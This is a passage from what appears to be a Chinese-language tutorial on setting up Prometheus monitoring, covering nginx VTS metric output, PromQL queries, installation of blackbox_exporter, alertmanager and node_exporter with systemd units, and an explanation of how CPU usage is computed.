3044526nginx_vts_server_bytes_total{host=&quot;devapi.feedback.test&quot;,direction=&quot;out&quot;} 41257028 # 分状态的连接数的统计nginx_vts_server_requests_total{host=&quot;devapi.feedback.test&quot;,code=&quot;1xx&quot;} 0nginx_vts_server_requests_total{host=&quot;devapi.feedback.test&quot;,code=&quot;2xx&quot;} 3983nginx_vts_server_requests_total{host=&quot;devapi.feedback.test&quot;,code=&quot;3xx&quot;} 0nginx_vts_server_requests_total{host=&quot;devapi.feedback.test&quot;,code=&quot;4xx&quot;} 24nginx_vts_server_requests_total{host=&quot;devapi.feedback.test&quot;,code=&quot;5xx&quot;} 11nginx_vts_server_requests_total{host=&quot;devapi.feedback.test&quot;,code=&quot;total&quot;} 4018nginx_vts_server_request_seconds_total{host=&quot;devapi.feedback.test&quot;} 327.173nginx_vts_server_request_seconds{host=&quot;devapi.feedback.test&quot;} 0.000 # nginx缓存计算器，精确到状态和typenginx_vts_server_cache_total{host=&quot;devapi.feedback.test&quot;,status=&quot;miss&quot;} 0nginx_vts_server_cache_total{host=&quot;devapi.feedback.test&quot;,status=&quot;bypass&quot;} 0nginx_vts_server_cache_total{host=&quot;devapi.feedback.test&quot;,status=&quot;expired&quot;} 0nginx_vts_server_cache_total{host=&quot;devapi.feedback.test&quot;,status=&quot;stale&quot;} 0nginx_vts_server_cache_total{host=&quot;devapi.feedback.test&quot;,status=&quot;updating&quot;} 0nginx_vts_server_cache_total{host=&quot;devapi.feedback.test&quot;,status=&quot;revalidated&quot;} 0nginx_vts_server_cache_total{host=&quot;devapi.feedback.test&quot;,status=&quot;hit&quot;} 0nginx_vts_server_cache_total{host=&quot;devapi.feedback.test&quot;,status=&quot;scarce&quot;} 0nginx_vts_server_bytes_total{host=&quot;testapi.feedback.test&quot;,direction=&quot;in&quot;} 55553573nginx_vts_server_bytes_total{host=&quot;testapi.feedback.test&quot;,direction=&quot;out&quot;} 9667561188nginx_vts_server_requests_total{host=&quot;testapi.feedback.test&quot;,code=&quot;1xx&quot;} 0nginx_vts_server_requests_total{host=&quot;testapi.feedback.test&quot;,code=&quot;2xx&quot;} 347949nginx_vts_server_requests_total{host=&quot;testapi.feedback.test&quot;,code=&quot;3xx&quot;} 31nginx_vts_server_requests_total{host=&quot;testapi.feedback.test&quot;,code=&quot;4xx&quot;} 7nginx_vts_server_requests_total{host=&quot;testapi.feedback.test&quot;,code=&quot;5xx&quot;} 33nginx_vts_server_requests_total{host=&quot;testapi.feedback.test&quot;,code=&quot;total&quot;} 348020nginx_vts_server_request_seconds_total{host=&quot;testapi.feedback.test&quot;} 2185.177nginx_vts_server_request_seconds{host=&quot;testapi.feedback.test&quot;} 0.001nginx_vts_server_cache_total{host=&quot;testapi.feedback.test&quot;,status=&quot;miss&quot;} 0nginx_vts_server_cache_total{host=&quot;testapi.feedback.test&quot;,status=&quot;bypass&quot;} 0nginx_vts_server_cache_total{host=&quot;testapi.feedback.test&quot;,status=&quot;expired&quot;} 0nginx_vts_server_cache_total{host=&quot;testapi.feedback.test&quot;,status=&quot;stale&quot;} 0nginx_vts_server_cache_total{host=&quot;testapi.feedback.test&quot;,status=&quot;updating&quot;} 0nginx_vts_server_cache_total{host=&quot;testapi.feedback.test&quot;,status=&quot;revalidated&quot;} 0nginx_vts_server_cache_total{host=&quot;testapi.feedback.test&quot;,status=&quot;hit&quot;} 0nginx_vts_server_cache_total{host=&quot;testapi.feedback.test&quot;,status=&quot;scarce&quot;} 0nginx_vts_server_bytes_total{host=&quot;*&quot;,direction=&quot;in&quot;} 81519563nginx_vts_server_bytes_total{host=&quot;*&quot;,direction=&quot;out&quot;} 10807014221 # 分host请求数量统计nginx_vts_server_requests_total{host=&quot;*&quot;,code=&quot;1xx&quot;} 0nginx_vts_server_requests_total{host=&quot;*&quot;,code=&quot;2xx&quot;} 438741nginx_vts_server_requests_total{host=&quot;*&quot;,code=&quot;3xx&quot;} 31nginx_vts_server_requests_total{host=&quot;*&quot;,code=&quot;4xx&quot;} 33nginx_vts_server_requests_total{host=&quot;*&quot;,code=&quot;5xx&quot;} 44nginx_vts_server_requests_total{host=&quot;*&quot;,code=&quot;total&quot;} 438849nginx_vts_server_request_seconds_total{host=&quot;*&quot;} 2512.350nginx_vts_server_request_seconds{host=&quot;*&quot;} 0.007 # 分host缓存统计nginx_vts_server_cache_total{host=&quot;*&quot;,status=&quot;miss&quot;} 0nginx_vts_server_cache_total{host=&quot;*&quot;,status=&quot;bypass&quot;} 0nginx_vts_server_cache_total{host=&quot;*&quot;,status=&quot;expired&quot;} 0nginx_vts_server_cache_total{host=&quot;*&quot;,status=&quot;stale&quot;} 0nginx_vts_server_cache_total{host=&quot;*&quot;,status=&quot;updating&quot;} 0nginx_vts_server_cache_total{host=&quot;*&quot;,status=&quot;revalidated&quot;} 0nginx_vts_server_cache_total{host=&quot;*&quot;,status=&quot;hit&quot;} 0nginx_vts_server_cache_total{host=&quot;*&quot;,status=&quot;scarce&quot;} 0# HELP nginx_vts_upstream_bytes_total The request/response bytes# TYPE nginx_vts_upstream_bytes_total counter# HELP nginx_vts_upstream_requests_total The upstream requests counter# TYPE nginx_vts_upstream_requests_total counter# HELP nginx_vts_upstream_request_seconds_total The request Processing time including upstream in seconds# TYPE nginx_vts_upstream_request_seconds_total counter# HELP nginx_vts_upstream_request_seconds The average of request processing times including upstream in seconds# TYPE nginx_vts_upstream_request_seconds gauge# HELP nginx_vts_upstream_response_seconds_total The only upstream response processing time in seconds# TYPE nginx_vts_upstream_response_seconds_total counter# HELP nginx_vts_upstream_response_seconds The average of only upstream response processing times in seconds# TYPE nginx_vts_upstream_response_seconds gauge# HELP nginx_vts_upstream_request_duration_seconds The histogram of request processing time including upstream# TYPE nginx_vts_upstream_request_duration_seconds histogram# HELP nginx_vts_upstream_response_duration_seconds The histogram of only upstream response processing time# TYPE nginx_vts_upstream_response_duration_seconds histogram # 分upstream流量统计nginx_vts_upstream_bytes_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.144.227.162:80&quot;,direction=&quot;in&quot;} 12296nginx_vts_upstream_bytes_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.144.227.162:80&quot;,direction=&quot;out&quot;} 13582924nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.144.227.162:80&quot;,code=&quot;1xx&quot;} 0nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.144.227.162:80&quot;,code=&quot;2xx&quot;} 25nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.144.227.162:80&quot;,code=&quot;3xx&quot;} 0nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.144.227.162:80&quot;,code=&quot;4xx&quot;} 0nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.144.227.162:80&quot;,code=&quot;5xx&quot;} 0nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.144.227.162:80&quot;,code=&quot;total&quot;} 25nginx_vts_upstream_request_seconds_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.144.227.162:80&quot;} 1.483nginx_vts_upstream_request_seconds{upstream=&quot;::nogroups&quot;,backend=&quot;10.144.227.162:80&quot;} 0.000nginx_vts_upstream_response_seconds_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.144.227.162:80&quot;} 1.484nginx_vts_upstream_response_seconds{upstream=&quot;::nogroups&quot;,backend=&quot;10.144.227.162:80&quot;} 0.000nginx_vts_upstream_bytes_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.152.218.149:80&quot;,direction=&quot;in&quot;} 12471nginx_vts_upstream_bytes_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.152.218.149:80&quot;,direction=&quot;out&quot;} 11790508nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.152.218.149:80&quot;,code=&quot;1xx&quot;} 0nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.152.218.149:80&quot;,code=&quot;2xx&quot;} 24nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.152.218.149:80&quot;,code=&quot;3xx&quot;} 0nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.152.218.149:80&quot;,code=&quot;4xx&quot;} 0nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.152.218.149:80&quot;,code=&quot;5xx&quot;} 0nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.152.218.149:80&quot;,code=&quot;total&quot;} 24nginx_vts_upstream_request_seconds_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.152.218.149:80&quot;} 1.169nginx_vts_upstream_request_seconds{upstream=&quot;::nogroups&quot;,backend=&quot;10.152.218.149:80&quot;} 0.000nginx_vts_upstream_response_seconds_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.152.218.149:80&quot;} 1.168nginx_vts_upstream_response_seconds{upstream=&quot;::nogroups&quot;,backend=&quot;10.152.218.149:80&quot;} 0.000nginx_vts_upstream_bytes_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8081&quot;,direction=&quot;in&quot;} 3036924nginx_vts_upstream_bytes_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8081&quot;,direction=&quot;out&quot;} 33355357nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8081&quot;,code=&quot;1xx&quot;} 0nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8081&quot;,code=&quot;2xx&quot;} 3971nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8081&quot;,code=&quot;3xx&quot;} 0nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8081&quot;,code=&quot;4xx&quot;} 24nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8081&quot;,code=&quot;5xx&quot;} 11nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8081&quot;,code=&quot;total&quot;} 4006nginx_vts_upstream_request_seconds_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8081&quot;} 326.427nginx_vts_upstream_request_seconds{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8081&quot;} 0.000nginx_vts_upstream_response_seconds_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8081&quot;} 300.722nginx_vts_upstream_response_seconds{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8081&quot;} 0.000nginx_vts_upstream_bytes_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8082&quot;,direction=&quot;in&quot;} 55536408nginx_vts_upstream_bytes_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8082&quot;,direction=&quot;out&quot;} 9650089427nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8082&quot;,code=&quot;1xx&quot;} 0nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8082&quot;,code=&quot;2xx&quot;} 347912nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8082&quot;,code=&quot;3xx&quot;} 31nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8082&quot;,code=&quot;4xx&quot;} 7nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8082&quot;,code=&quot;5xx&quot;} 33nginx_vts_upstream_requests_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8082&quot;,code=&quot;total&quot;} 347983nginx_vts_upstream_request_seconds_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8082&quot;} 2183.271nginx_vts_upstream_request_seconds{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8082&quot;} 0.001nginx_vts_upstream_response_seconds_total{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8082&quot;} 2180.893nginx_vts_upstream_response_seconds{upstream=&quot;::nogroups&quot;,backend=&quot;10.160.21.205:8082&quot;} 0.001 9.Prometheus UI中Target表达式查询1）CAdvisor中获取的典型监控指标 指标名称 类型 含义 container_cpu_load_average_10s gauge 过去10秒内容器CPU的平均负载 container_cpu_usage_seconds_total counter 容器在每个CPU内核上的累积占用时间 (单位：秒) container_cpu_system_seconds_total counter System CPU累积占用时间（单位：秒） container_cpu_user_seconds_total counter User CPU累积占用时间（单位：秒） container_fs_usge_bytes gauge 容器中文件系统的使用量(单位：字节) container_network_receive_bytes_total counter 容器网络累计接受数据总量（单位: 字节） container_network_transmit_bytes_total counter 容器网络累计传输数据总量（单位: 字节） 2）容器相关 1234567891011121314151617# 容器的CPU使用率sum(irate(container_cpu_usage_seconds_total{image!=&quot;&quot;}[1m])) without (cpu) # 容器内存使用量（单位: 字节）container_memory_usage_bytes{image!=&quot;&quot;} # 容器网络接收量速率（单位: 字节/秒）sum(rate(container_network_receive_bytes_total{image!=&quot;&quot;}[1m])) without (interface) # 容器网络传输量速率sum(rate(container_network_transmit_bytes_total{image!=&quot;&quot;}[1m])) without (interface) # 容器文件系统读取速率sum(rate(container_fs_reads_bytes_total{image!=&quot;&quot;}[1m])) without (device) # 容器文件系统写入速率（单位: 字节/秒）sum(rate(container_fs_writes_bytes_total{image!=&quot;&quot;}[1m])) without (device) 3）http相关 1234567891011121314151617181920# HTTP请求总数prometheus_http_requests_total # HTTP请求持续时间秒桶prometheus_http_request_duration_seconds_bucket # HTTP请求持续时间秒数计数prometheus_http_request_duration_seconds_count # HTTP请求持续时间秒数之和prometheus_http_request_duration_seconds_sum # HTTP响应大小字节prometheus_http_response_size_bytes_bucket # HTTP响应大小字节计数计数prometheus_http_response_size_bytes_count # HTTP响应大小字节的总和prometheus_http_response_size_bytes_sum 4）Nginx相关 1234567891011121314151617181920212223242526272829303132333435363738394041# Nginxvts过滤字节总数nginx_vts_filter_bytes_total # Nginx VTS过滤器缓存总数nginx_vts_filter_cache_total # Nginx VTS过滤请求秒数nginx_vts_filter_request_seconds # Nginx VTS过滤器请求总秒数nginx_vts_filter_request_seconds_total # Nginx VTS过滤器请求总数nginx_vts_filter_requests_total # nginx信息nginx_vts_info # Nginx VTS主连接nginx_vts_main_connections # Nginx VTS主SHM使用字节nginx_vts_main_shm_usage_bytes # Nginx VTS服务器字节总数nginx_vts_server_bytes_total # Nginx VTS服务器缓存总数nginx_vts_server_cache_total # Nginx_vts服务器请求秒nginx_vts_server_request_seconds # Nginx_vts服务器请求总秒数nginx_vts_server_request_seconds_total # Nginx_vts服务总请求数nginx_vts_server_requests_total # Nginx VTS开始时间秒数nginx_vts_start_time_seconds 10.安装blackbox_exporter blackbox收集服务状态信息，如判断服务http请求是否返回200继而报警 blackbox_exporter是Prometheus 官方提供的 exporter 之一，可以提供 http、dns、tcp、icmp 的监控数据采集 12345678910111213141516171819202122232425262728293031323334353637383940414243444546功能：HTTP 测试 定义 Request Header 信息 判断 Http status / Http Respones Header / Http Body 内容 TCP 测试 业务组件端口状态监听 应用层协议定义与监听 ICMP 测试 主机探活机制 POST 测试 接口联通性 SSL 证书过期时间 # 下载、解压wget https://github.com/prometheus/blackbox_exporter/releases/download/v0.14.0/blackbox_exporter-0.14.0.linux-amd64.tar.gz tar -xvf blackbox_exporter-0.14.0.linux-amd64.tar.gz mv blackbox_exporter-0.14.0.linux-amd64 /usr/local/blackbox_exporter # 查看安装是否成功/usr/local/blackbox_exporter/blackbox_exporter --versionblackbox_exporter, version 0.14.0 (branch: HEAD, revision: bba7ef76193948a333a5868a1ab38b864f7d968a) build user: root@63d11aa5b6c6 build date: 20190315-13:32:31 go version: go1.11.5 # 加入systemd管理vim /usr/lib/systemd/system/blackbox_exporter.service[Unit]Description=blackbox_exporter [Service]User=rootType=simpleExecStart=/usr/local/blackbox_exporter/blackbox_exporter --config.file=/usr/local/blackbox_exporter/blackbox.ymlRestart=on-failure # 启动systemctl daemon-reloadsystemctl enable --now blackbox_exporter 二，通过官网源码解压安装1.安装Prometheus_server 去官网下载prometheus.io 1wget https://github.com/prometheus/prometheus/releases/download/v2.43.0/prometheus-2.43.0.linux-amd64.tar.gz prometheus的安装非常简单 12tar xzf prometheus-2.43.0.linux-amd64.tar.gzcp -rf prometheus-2.43.0.linux-amd64 /usr/local/prometheus Prometheus 启动和后台运行 12345678910cd /usr/local/prometheus/./prometheus 通过tmux运行程序。tmux./prometheusCtrl+b +d 退出当前窗口tmux a 进入a窗口 第二种加入后台启动的方式 daemonize Unix系统后台守护进程管理软件 优点:更加正规 后台运行更稳定 1234567git clone git://github.com/bmc/daemonize.git sh configure &amp;&amp; make &amp;&amp; sudo make installdaemonize -c /data/prometheus/ /data/prometheus/up.sh-c 是指定运行路径/data/prometheus/up.sh是运行路径下的一个启动脚本 下面就是这个启动脚本的内容 内容：就是开启prometheus进程 12345678910111213141516cat /data/prometheus/up.sh/data/prometheus/prometheus --web.listen-address=&quot;0.0.0.0:9090&quot; --web.read-timeout=5m --web.max-connections=10 --storage.tsdb.retention=15d --storage.tsdb.path=&quot;data/&quot; --query.max-concurrency=20 --query.timeout=2m 参数解释--web.read-timeout=5m 请求链接的最大等待时间，防止太多的空闲链接，占用资源--storage.tsdb.retention=15dprometheus开始采集监控数据之后，会存在内存中和硬盘中，对于保留期限的设置很重要，太长的话，硬盘和内存都吃不消，太短的话，要查历史数据就没有了，企业中设置15天为宜。--storage.tsdb.path=&quot;data/&quot;存储数据路径，这个也很重要，不要随便放在一个地方就执行，会把/跟目录塞满了。--query.timeout=2m--query.max-concurrency=20这两项是对用户执行prometheus查询时候的优化设置防止太多的用户同时查询，也防止单个用户执行过大的查询而一直不退出。配置以上参数后，prometheus运行就相对稳妥多了。 第三种加入后台启动的方式(推荐) 创建一个专门的prometheus用户 1useradd -M -s /usr/sbin/nologin prometheus 更改prometheus用户的文件夹权限 1chown prometheus:prometheus -R /usr/local/prometheus/ 创建systemd服务 1234567891011[Unit]Description=prometheusDocumentation=https://prometheus.io/After=network.target[Service]Type=simpleUser=prometheusGroup=prometheusExecStart=/usr/local/prometheus/prometheus --config.file=/usr/local/prometheus/prometheus.yml --storage.tsdb.path=/usr/local/prometheus/data --web.enable-lifecycle --storage.tsdb.retention=30dRestart=on-failure[Install]WantedBy=multi-user.target 加载 123systemctl daemon-reload启动systemctl start prometheus.service 然后，看下 ./prometheus 在实际企业运行是启动参数的合理配置。 1ps -ef | grep prometheus 之后默认运行在9090端口 浏览器可以直接打开访问，无账号密码验证(如果希望加上验证，可以使用类似apache httppass方式添加) http://192.168.224.11:9090/graph 监控指标 http://192.168.224.11:9090/metrics 接下来看一下Prometheus的主配置文件 prometheus解压安装之后，就默认自带了一个基本的配置文件如下 1vim /usr/local/prometheus/prometheus.yml 配置文件的大致内容 1234567891011121314151617181920212223# my global configglobal: scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. # scrape_timeout is set to the global default (10s).前面两个是全局变量scrape_interval 抓取采样数据的时间，默认是15秒去被监控机采样一次，这个就是prometheus的自定义数据采集频率了。evaluation_interval 监控数据规则的评估率。这个参数是prometheus多长时间会进行一次监控规则评估。比如设置 当内存使用量&gt;70%时，发出警报，这么一条rule(规则)，那么prometheus会默认每15秒来执行一次这个规则，检查内存的情况。# Alertmanager configurationalerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093Alertmanager 是prometheus的一个用于管理和发出报警的插件我采用的是4.0以上版本的Grafana,本身就已经支持报警发出功能了。 再往后就是prometheus重要的配置采集节点的设置 12345678910111213141516171819202122# Here it's Prometheus itself.scrape_configs: # The job name is added as a label `job=&lt;job_name&gt;` to any timeseries scraped from this config. - job_name: &quot;prometheus&quot; # metrics_path defaults to '/metrics' # scheme defaults to 'http'. static_configs: - targets: [&quot;localhost:9090&quot;]先定义一个job的名称 - job_name: &quot;prometheus&quot; 然后定义监控节点targets # metrics_path defaults to '/metrics' # scheme defaults to 'http'. static_configs: - targets: [&quot;localhost:9090&quot;] -targets 的设定 以这种形式设定默认带了一个prometheus本机的 123static_configs:- targets:['localhost:9090' 这里可以继续扩展加入其他需要被监控的节点 比如： 123- job_name: 'aliyun' static_config: - targets:['server04:9100','web3:9100','nginx06:9100','web07:9100','redis07:9100','log:9100','redis02:9100'] targets可以并列写入多个节点，用逗号隔开，机器名+端口号 端口号:通常用的就是exporters的端口，这里的9100就是node_exporter的默认端口。 如此prometheus就可以通过配置文件识别监控的节点，持续采集数据。 prometheus到此就算初步搭建好了。 光搭建好prometheus_server是不够的，我们需要给监控节点搭建一个exporter用来采集数据，选用企业中最常用的node_exporter这个插件。 node_exporter是一个以http_server方式运行在后台，并且持续采集linux系统中各种操作系统本身相关的监控参数的程序，其采集量是很大很全的，往往默认的采集项目就远超过你的实际需求。 2.安装alermanager从官网下载 12345678910https://prometheus.io/download/wget https://github.com/prometheus/alertmanager/releases/download/v0.25.0/alertmanager-0.25.0.linux-amd64.tar.gz解压tar xzf alertmanager-0.25.0.linux-amd64.tar.gz mv alertmanager-0.25.0.linux-amd64 /usr/local/alertmanager授权chown -R prometheus.prometheus /usr/local/alertmanager/ 创建systemd服务 1234567891011121314151617181920cat &gt;/etc/systemd/system/alertmanager.service &lt;&lt; &quot;EOF&quot;[Unit]Description=Alert ManagerWants=network-online.targetAfter=network-online.target[Service]Type=simpleUser=prometheusGroup=prometheusExecStart=/usr/local/alertmanager/alertmanager \\--config.file=/usr/local/alertmanager/alertmanager.yml \\--storage.path=/usr/local/alertmanager/dataRestart=always[Install]WantedBy=multi-user.targetEOF 启动alertmanager 123systemctl daemon-reloadsystemctl start alertmanager.service systemctl status alertmanager.service 访问端口 1http://192.168.224.11:9093/#/alerts 修改prometheus配置 加入alertmanager 123456789101112131415# Alertmanager configurationalerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093 - localhost:9093# Load rules once and periodically evaluate them according to the global 'evaluation_interval'.rule_files: # - &quot;first_rules.yml&quot; # - &quot;second_rules.yml&quot; # 根据实际修改文件名 - &quot;alert.yml&quot; 增加触发器配置文件 1234567891011121314cat &gt; /usr/local/prometheus/alert.yml &lt;&lt;&quot;EOF&quot;groups:- name: Prometheus alert rules: #对任何实例超过30s无法联系的情况发出警报 - alert: 服务器告警 expr: up == 0 for: 30s labels: severity: critical annotations: instance: &quot;{{ $labels.instance }}&quot; description: &quot;{{ $labels.job }} 服务关闭&quot;EOF 检查配置 12cd /usr/local/prometheus/ ./promtool check config prometheus.yml 重启prometheus或者重载 123systemctl restart prometheus.service 或者重载，需要--web.enable-lifecycle配置curl -X POST http://localhost:9090/-/reload 访问地址 1http://192.168.224.11:9093/#/alerts 检查 3.安装node_exporter从官网下载 12345678910111213141516171819wget https://github.com/prometheus/node_exporter/releases/download/v1.5.0/node_exporter-1.5.0.linux-amd64.tar.gz解压tar xzf node_exporter-1.5.0.linux-amd64.tar.gz cp -rf node_exporter-1.5.0.linux-amd64 /usr/local/node_exporter更改 node_exporter文件权限 chown -R prometheus.prometheus /usr/local/node_exporter/tmux 进入新终端cd /usr/local/node_exporter./node_exportertmux ls 查看已创建的会话终端tmux a -t 2 进入一个会话，名为2查看是否运行起来了。node_exporter]# netstat -putnal | grep nodetcp6 0 0 :::9100 :::* LISTEN 64349/./node_export 创建systemd服务 12345678910111213141516cat &gt;/etc/systemd/system/node_exporter.service &lt;&lt; &quot;EOF&quot;[Unit]Description=node_exporterDocumentation=https://prometheus.io/After=network.target[Service]User=prometheusGroup=prometheusExecStart=/usr/local/node_exporter/node_exporterRestart=on-failure[Install]WantedBy=multi-user.targetEOF 启动node_exporter 1234systemctl daemon-reloadsystemctl start node_exporter.service systemctl status node_exporter.service systemctl enable node_exporter.service 检查日志 1journalctl -u node_exporter.service -f 修改promethsu.yml配置 123456- job_name: &quot;node-exporter&quot; scrape_interval: 15s static_configs: - targets: [&quot;localhost:9100&quot;] labels: instance: Prometheus服务器 重载prometheus 123systemctl restart prometheus或者curl -X POST http://localhost:9090/-/reload 可以看到node_exporter默认端口是9100 可以响应prometheus_server发过来的http_get请求， 也可以响应其他方式的http_get请求 可以发送测试 1curl localhost:9100/metrics 执行curl 之后，我们看到node_exporter给我们返回了大量的这种metrics类型K/V数据, 这些返回的K/V数据，其中的Key的名称就可以直接复制粘贴在prometheus的查询命令行来查看结果了。 比如查看这一项 node_menory_MemFree 1234 curl localhost:9100/metrics |grep node_menory_MemFree % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 70942 0 70942 0 0 2804k 0 --:--:-- --:--:-- --:--:-- 2886k 也可以在后台才看，比如我查看其他信息 1node_cpu_seconds_total 直接看到曲线了， prometheus对Linux CPU的采集并不是直接给我们返回一个现成的CPU百分比，而是返回linux中很底层的cpu时间线累积的数值的这样一个数据(我们平时用惯 了top/uptime这种简便的方式查看CPU使用率，往往浅尝，根本没有好好深入理解，所谓的CPU使用率在linux中到底是怎么回事，) 其实，如果想真的弄明白CPU的使用率这个概念，在linux中，要先从CPU时间这概念开始建立，linux中CPU时间实际是指，从操作系统开启算起CPU就开始工作了，并记录自己在工作中总共使用的”时间”的累积量把他保存在系统中，而累积的CPU使用时间还会分成几个重要的状态类型。 比如CPU time=&gt;分成 CPU user time / sys time / nice time / idle time / irq/等等。 翻译过来就是CPU用户态使用时间，系统/内核态使用时间，nice值分配使用时间，空闲时间，中断时间等等。 所谓的cpu使用率是什么意思呢。 CPU使用率最准确的定义其实就是CPU各种状态中除了idle(空闲)这个状态外，其他所有 的CPU状态加合/总的CPU时间得出来得就是我们所说的CPU使用率。 所以：如果在prometheus中想对CPU的使用率准确的来查询 正确的方法如下: 123(1-((sum(increase(node_cpu{mode=&quot;idle&quot;}[1m]))by(instance))/(sum(increase(node_cpu[1m]))by(instance))))*100(1-((sum(increase(node_cpu_seconds_total{mode=&quot;idle&quot;}[1m]))by(instance))/(sum(increase(node_cpu_seconds_total[1m]))by(instance)))) * 100 prometheus这种底层数据采集所形成的监控，其实是最准确最可信的。 prometheus本身也逼着使用它的运维同学，不踏实下来，好好真正的把linux技术学过关的话，就没有办法使用好这个超强力的监控工具了。 三, prometheus的使用指标(Metric)的四种类型 Prometheus底层存储上其实并没有对指标做类型区分，都是以时间序列形式存储，但为了方便用户的使用和理解不同监控指标之间的差异，Prometheus定义理论counter(计数器)、gauge(仪表盘)、histogram(直方图)、以及summary(摘要)这4中Metrics类型。 Exporter插件来源社区提供的 1https://prometheus.io/docs/instrumenting/exporters/ Prometheus社区提供了丰富的Exporter实现，覆盖了从基础设施，中间件以及网络等各方面的监控功能。这些exporter可以实现大部分通用的监控需求，下面是一些常用的exporter. prometheus计算CPU的使用率算法12点开机后一直到12:30截止 这30分钟的过程中(当前暂时忽略是几核CPU，就当做1核来说) CPU被使用在用户态的时间一共是8分钟 CPU被使用在内核态的时间一共是1.5分钟 CPU被使用在IO等待状态的时间一共是0.5分钟 CPU被使用在Idle(空闲状态)的时间一共是20分钟 CPU被使用在其他几个状态的时间是0 CPU的使用率=(所有非空闲状态的CPU使用时间总和) / (所有状态CPU时间的总和) 123(user(8mins)+sys(1.5mins)+iowa(0.5min)+0+0+0+0) / (30mins)=10分钟/30分钟=30% 更简明的算法 123idle(20mins) / (30mins) = 70%空闲时间除以总时间等于空闲CPU的比例100%-70%= 30% 上面这样的方法去计算最终只能算出CPU在30分钟内的总平均时间 如果要计算某一分钟之内CPU的总平均时间是多少？？ node_cpu给我们返回的是Counter的数据。Counter是一个一直持续增长的数值 现在面临的问题是30分钟内CPU使用时间持续增长，我们需要截取其中一段增长的增量值，如果我们能获取1分钟的增量值，然后拿这个数值再去使用刚才同样的计算公式，就能得到1分钟的平均值了。 promeheus的数学查询命令行其实给我们提供了非常丰富的计算函数， increase() increase函数在prometheus中，是用来针对Counter这种持续增长的数值，截取其中一段时间的增量 increase(node_cpu[1m]) 这样就获取了CPU总使用时间在一分钟内的增量 实际工作中的CPU大多数都是多核的 node_exporter给我们采集的数据也是细到采集到每一个核的CPU时间 我们在实际监控中，往往并不是太关注每一个CPU核表现时间如何，而是希望知道整个CPU表现如何 如果每一个核都单独来监控曲线图意义不大，而且看着比较混乱。 如何解决这个问题。 prometheus提供了另一个sum()函数。 sum()就如其字面意思一样，起到加合的作用。 sum(increase(node_cpu[1m])) 外面套用一个sum即可把所有核数加合问题就可以解决了。 然后把prometheus计算公式在下一个阶段进行拆分讲解 拆分并解释这个运行公式 1(1-((sum(increase(node_cpu_seconds_total{mode=&quot;idle&quot;}[1m]))by(instance))/(sum(increase(node_cpu_seconds_total[1m]))by(instance)))) * 100 这个prometheus的计算公式其实就是那个使用100%-(空闲时间/总时间)的方法，不过这个公式直接拿来看还是比较痛苦，来学一下拆分 首先第一步， node_cpu_seconds_total是我们需要使用的key name 直接输入后如上图所示，目前这种图没有任何意义，我们继续完善命令行 第二步 把idle的CPU时间和全部CPU时间都给过滤出来使用{}做过滤 1node_cpu_seconds_total{mode=&quot;idle&quot;} 第三步 使用increase( [1m]) 把node_cpu_seconds_total{mode=”idle”}包起来 1increase(node_cpu_seconds_total{mode=&quot;idle&quot;}[1m]) 这样就把一分钟的增量的CPU时间给取出来了。 第四步 使用sum()再包一层。 1sum(increase(node_cpu_seconds_total{mode=&quot;idle&quot;}[1m])) 